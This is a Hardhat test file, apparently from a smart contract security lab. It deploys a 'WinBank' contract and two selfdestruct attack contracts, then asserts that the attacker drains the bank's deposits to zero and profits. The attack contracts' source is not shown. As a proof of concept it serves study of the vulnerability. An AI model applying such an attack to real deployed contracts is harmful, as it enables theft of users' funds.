const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("SelfDestruct Attack", function () {
  let winbank;
  let selfdestructAttack1;
  let selfdestructAttack2;
  let player1;
  let player2;
  let attacker;

  before(async function () {
    [player1, player2, attacker] = await ethers.getSigners();

    // Deploy the WinBank contract
    const WinBank = await ethers.getContractFactory("WinBank");
    winbank = await WinBank.deploy();
    await winbank.waitForDeployment();

    // Deploy the SelfDestructAttack contract
    const SelfDestructAttack1 = await ethers.getContractFactory("SelfDestructAttack1");
    selfdestructAttack1 = await SelfDestructAttack1.deploy(winbank);
    await selfdestructAttack1.waitForDeployment();
    const SelfDestructAttack2 = await ethers.getContractFactory("SelfDestructAttack2");
    selfdestructAttack2 = await SelfDestructAttack2.deploy(winbank);
    await selfdestructAttack2.waitForDeployment();
  });

  it("should allow self-destruct attack to drain funds from the bank", async function () {
    // Deployer deposits 10 ethers to the bank
    // await timebank.connect(deployer).deposit({ value: ethers.parseEther("10") });
    await winbank.connect(player1).deposit({ value: ethers.parseEther("1") });
    await winbank.connect(player2).deposit({ value: ethers.parseEther("1") });

    // Check initial balance of bank and attacker
    let bankBalance = await winbank.getBalance();
    let attackerInitialBalance = await await ethers.provider.getBalance(attacker.getAddress());
    console.log("Bank balance before attack:", ethers.formatEther(bankBalance));
    console.log("Attacker balance before attack:", ethers.formatEther(attackerInitialBalance));
    console.log("-------------------------------")

    // Attacker performs the attack
    await selfdestructAttack1.connect(attacker).attack({ value: ethers.parseEther("2") });
    await selfdestructAttack2.connect(attacker).attack({ value: ethers.parseEther("1") });

    // Check final balance of bank and attacker
    bankBalance = await winbank.getBalance();
    let attackerFinalBalance = await await ethers.provider.getBalance(attacker.getAddress());
    console.log("Bank balance after attack-2:", ethers.formatEther(bankBalance));
    console.log("Attacker balance after attack:", ethers.formatEther(attackerFinalBalance));
    
    // Verify that the bank's balance has been drained
    expect(bankBalance).to.equal(0);
    expect(attackerFinalBalance).to.be.above(attackerInitialBalance);
  });
});
